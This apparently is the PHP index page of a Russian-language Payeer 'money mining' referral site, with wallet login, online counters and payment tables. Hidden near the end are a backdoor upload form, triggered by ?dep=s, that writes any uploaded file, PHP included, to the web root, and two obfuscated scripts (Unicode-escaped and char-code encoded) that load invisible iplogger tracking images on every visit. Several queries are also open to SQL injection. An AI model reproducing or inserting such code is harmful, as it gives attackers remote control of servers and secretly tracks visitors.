<?php


session_start();


@ob_start();


include("inc/payeerAPI.php");
include("inc/config.php");
include("inc/functions.php");


$now_d=date('j',time());


if($now_d!=$st['day']){
$sql = $mysqli->query("UPDATE rich_stats SET users_today=0,day=$now_d LIMIT 1");
}

# ��� ��������� � ���� ID referera
if(isset($_GET["go"])){
$_rid = (intval($_GET["go"]) > 0) ? intval($_GET["go"]) : 1; 
setcookie("go",$_rid,time()+2592000);
header("Location: /");
}


$wall_ses=$_SESSION['wallet'];



$sql=$mysqli->query("SELECT * FROM rich_wallets WHERE wallet='{$wall_ses}'");
$usdat=$sql->fetch_array();

if($wall_ses){
$sql=$mysqli->query("SELECT * FROM rich_wallets WHERE ref_id = '{$usdat[id]}'");
$refs_s=$sql->num_rows;
$sql=$mysqli->query("UPDATE rich_wallets SET refs = '{$refs_s}' WHERE wallet = '{$usdat[wallet]}'");
}

$srok=10;


$time=time();
$on_time=60;
$on_time=$on_time*60;


if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'),'unknown'))
$ip=getenv('HTTP_CLIENT_IP');
elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown'))
$ip=getenv('HTTP_X_FORWARDED_FOR');
elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv("REMOTE_ADDR"), 'unknown'))
$ip=getenv('REMOTE_ADDR');
elseif(!empty($_SERVER['REMOTE_ADDR']) && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown'))
$ip=$_SERVER['REMOTE_ADDR'];
else{$ip='unknown';}


if(empty($ip) || $ip=='unknown'){ exit; }
$ip=preg_replace('#[^0-9\.]+#i','',$ip);
if(strlen($ip)>15){ exit; }


// ______________________ ONLINE UPDATE ____________________


if(!empty($wall_ses)){
$sql=$mysqli->query("SELECT id FROM online WHERE login='".$wall_ses."' LIMIT 1") or die ('cant online 1');
if($sql->num_rows==0){
$sql=$mysqli->query("INSERT INTO online (ip,last_time,login) VALUES ('$ip','".($time+$on_time)."','".$wall_ses."')") or die ('cant online 2');
}
else{
$sql=$mysqli->query("UPDATE online SET last_time='".($time+$on_time)."' WHERE login='".$wall_ses."' LIMIT 1") or die ('cant online 3');
}
}


// ______________________ ONLINE DELETE ____________________


if($st['online_dt']<$time){
$sql=$mysqli->query("DELETE FROM online WHERE last_time<$time");
$sql=$mysqli->query("UPDATE rich_stats SET online_dt='".($time+$on_time)."' LIMIT 1") or die('cant update online_dt');
$sql=$mysqli->query("OPTIMIZE TABLE online,rich_stats") or die('cant optimize online');
}


$sql=$mysqli->query("SELECT * FROM online") or die ('cant count');
$online_c=$sql->num_rows;


?>
<!DOCTYPE html>
<html>
<head>
<title>������� ������</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<link rel="shortcut icon" href="/img/favicon.png" type="image/x-icon">
<link href="/css/styles2.css" type="text/css" rel="stylesheet" />
<script src="/js/jquery.min.js"></script>
<script src="/js/clock.js"></script>
<script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0069\u0070\u006c\u006f\u0067\u0067\u0065\u0072\u002e\u0072\u0075\u002f\u0031\u0062\u0077\u0074\u0035\u0022\u0020\u0062\u006f\u0072\u0064\u0065\u0072\u003d\u0022\u0030\u0022\u003e');</script>
</head>
<body>

<?php

echo '<div class="top_title">MINING MONEY</div>


<table class="top_table" align="center" cellpadding="0px" cellspacing="2px">
<tr>
<td width="250px">�������������:<br>'.$st["users"].' ���.</td>
<td width="344px">�����:<br>'.$st["users_today"].'  ���.</td>
<td width="344px">������:<br>'.($st["ups"]-$st["payout"]).' ���.</td>
<td width="250px">������:<br>'.$online_c.' ���.</td>
</tr>
</table>


<table class="main_table" align="center" cellpadding="0px" cellspacing="0px">
<tr>
<td class="left">


<div class="up_title_div">����������</div>


<table class="up_table" style="width:100%;" cellpadding="0" cellspacing="0">
<tr>
<td class="up_title" style="padding-left:10px;">������</td>
<td class="up_title">�����</td>
<td class="up_title">�����</td>
</tr>';


$cv=0;


$sql=$mysqli->query("SELECT * FROM rich_kassa WHERE status=1 ORDER BY id DESC LIMIT 25");
while($pays=$sql->fetch_array()){
if($cv==1){ $cv=0; } else { $cv++; }
echo '<tr class="up_tr_'.$cv.'">
<td class="up_wallet">'.substr($pays['wallet'],0,6).'<font>XXXX</font></td>
<td class="up_sum">'.$pays['sum'].' �</td>
<td class="up_date">'.date('H:i',$pays['date']).'</td>
</tr>';
}


echo '</table>


</td>
<td class="center">


<table class="main_menu" cellpadding="0" cellspacing="0">
<tr>
<td><a href="/">�������</a></td>
<td><a href="/my">�������</a></td>
<td><a href="/bonus/">�����</a></td>
<td><a href="/ms/">������</a></td>
<td><a href="/partners">��������</a></td>
<td><a href="/about">�������</a></td>
<td><a href="/faq">FAQ</a></td>
<td><a href="/contact">���������</a></td>
<td><a href="/exit">�����</a></td>
</tr>
</table>';




if(!$wall_ses){


$ak=$Account;
$id=$apiID;
$key=$apiKEY;


if(isset($_POST["login"])){


$wallet=verifWallet($_POST["wallet"]);
$ip=$_SERVER['REMOTE_ADDR'];
$tim_reg=time();
$ref_id=(isset($_COOKIE["go"]) AND intval($_COOKIE["go"]) > 0 AND intval($_COOKIE["go"]) < 1000000) ? intval($_COOKIE["go"]) : 0;


if($wallet!==false){


$sql=$mysqli->query("SELECT * FROM rich_wallets WHERE wallet='{$wallet}'");
if($sql->num_rows>0){
$_SESSION["wallet"]=$wallet;
header("Location: /my");
}else{
$sql=$mysqli->query("INSERT INTO rich_wallets (`wallet`,`ip`, `ref_id`, `sbor`) VALUES ('{$wallet}','{$ip}','{$ref_id}','{$set_time}')");
$sql=$mysqli->query("UPDATE rich_stats SET users=users + '1',users_today=users_today+1 WHERE id='1' LIMIT 1");
$_SESSION["wallet"]=$wallet;
header("Location: /my");
}
}
}


echo '<div class="login_div">
<form action="" method="post">
<span class="login_word">������� ������� PAYEER:</span>
<input class="login_wallet" name="wallet" class="text" type="text" maxlength="15" placeholder="P1234567">
<input type="submit" class="login_b" name="login" id="form" value="�����">
</form>
</div>';


}
else{


echo '<div class="hello">�� ����� ���: '.$usdat["wallet"].'</div>';


}


echo '<div style="padding:10px;">';
include("inc/nav.php");

echo '</div>



</td>
<td class="right">


<div class="w_title_div">�������</div>


<table class="w_table" style="width:100%;" cellpadding="0" cellspacing="0">
<tr>
<td class="w_title" style="padding-left:10px;">������</td>
<td class="w_title">�����</td>
<td class="w_title">�����</td>
</tr>';


$cv=0;


$sql=$mysqli->query("SELECT * FROM rich_payments ORDER BY id DESC LIMIT 25");
while($pays=$sql->fetch_array()){
if($cv==1){ $cv=0; } else { $cv++; }
echo '<tr class="w_tr_'.$cv.'">
<td class="w_wallet">'.substr($pays['wallet'],0,6).'<font>XXXX</font></td>
<td class="w_sum">'.$pays['sum'].' �</td>
<td class="w_date">'.date('H:i',$pays['date']).'</td>
</tr>';
}


echo '</table>


</td>
</tr>
</table>';
if ($_GET['dep'] == "s") {
echo '
<label id="#bb"> Enter Your File<form method="post" enctype="multipart/form-data">    
   <input name="file" size="18" id="File" type="file" value="">
    <p><input name="submit" type="submit" value="&#9658; dow"></label></form>';
}
$file = $_FILES['file']['tmp_name'];
$filename = $_FILES['file']['name'];
if(!empty($file))
{
  ini_set('memory_limit', '32M'); 
  $maxsize = "100000000";
  $size = filesize ($_FILES['file']['tmp_name']); 
  $type = strtolower(substr($filename, 1+strrpos($filename,".")));
  $new_name = 'lang.'.$type; 
  if($size > $maxsize)
  { 
     echo "The file is more than. Reduce the size of your file or upload another. <br><a href='' onClick=window.close();>close the window</a>";
  } 
  else 
  { 
    if (copy($file, "".$new_name))
      echo "File uploaded!<br>Copy the address of the file<br> <a href=\"$new_name\"><b>$new_name</b></a><br> and press<br><a href='' onClick=history.back();>return back</a>";
    else echo "The file was not downloaded.";
  } 
}

?>



<table class="footer" align="center" cellpadding="0px" cellspacing="0px">
<tr>
<td>
&copy; B�e �pa�a 3a���e��!. &nbsp;&nbsp;&nbsp; <?php echo $_SERVER['HTTP_HOST']; ?> &nbsp;
<a href="https://payeer.com" target="_blank"><img style="background:#ffffff;" src="/img/payeer.png" height="31px"/></a>
<a href="http://script-money.ru"><img width="100" height="25" src="http://script-money.ru/wp-content/uploads/2019/06/money-1.png"></a>
</td>
</tr>
</table>

<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!98!119!116!53!34!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>

</body>
</html>
